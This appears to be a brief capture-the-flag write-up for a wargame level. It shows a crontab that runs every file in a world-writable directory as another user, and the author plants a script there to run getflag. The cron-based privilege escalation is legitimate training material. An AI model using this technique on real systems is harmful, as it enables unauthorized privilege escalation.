When I first connected to level05 I had a message saying I had mail, so I looked in /var/mail/level05 and I saw

*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

It's a crontab so I looked in this file
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

So i created a script in /opt/openarenaserver
#!/bin/sh

getflag > /tmp/flag and then cat /tmp/flag
